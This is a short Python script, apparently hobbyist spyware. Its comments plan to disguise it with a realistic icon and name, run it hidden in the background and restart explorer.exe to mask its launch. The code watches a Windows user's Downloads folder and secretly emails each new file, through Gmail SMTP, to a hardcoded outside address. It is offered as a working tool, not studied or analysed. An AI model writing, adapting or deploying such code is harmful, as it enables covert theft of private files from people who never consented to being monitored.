#Download check
#1) Optional, start explorer.exe after ending it so it looks like its just starting up
#2) Have this file run in the background
#3) make the icon of this file realistic, and name also
#-----------------------------------------
#program
# wait and sniff the downloads folder for new downloads,
# attach this file to attachment and send
# add that file to that array so it will ignore it once scanned again
# (optional) end once one file is sent, end once class ends
#-----------------------------------------------------------------
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import time

def email(NewFile,down):
            email_user = 'theswiss.g@gmail.com'
            email_password = '#####'
            email_send = 'brandong55625@gmail.com'

            subject = "NEW FILE"

            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = email_send
            msg['Subject'] = subject

            body = 'Files'
            msg.attach(MIMEText(body,'plain'))

            filename= NewFile #file found
            attachment  =open(down+'\\'+filename,'rb')

            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',"attachment; filename= "+filename)

            msg.attach(part)
            text = msg.as_string()
            server = smtplib.SMTP('smtp.gmail.com',587)
            server.starttls()
            server.login(email_user,email_password)


            server.sendmail(email_user,email_send,text)
            server.quit()
            
down = 'C:\\Users\\COD_User\\Downloads'

def main():
    end = False
    length = len(os.listdir(down))
    limit = length 
    old = os.listdir(down) 
    while end == False:
        length = len(os.listdir(down))
        if length == limit:
            pass
        elif length > limit:
            new = os.listdir(down)
            for i in new:
                bowl = i in old
                if bowl == False:
                    if len(i) == 40:
                        pass
                    else:
                        new = os.listdir(down)
                        while i in new:
                            new = os.listdir(down)
                            
                        
                        end = True
    for i in new:
        check = i in old
        if check == False:
            NewFile = i
        else:
            pass


            
    email(NewFile,down)
    main()
main()











        
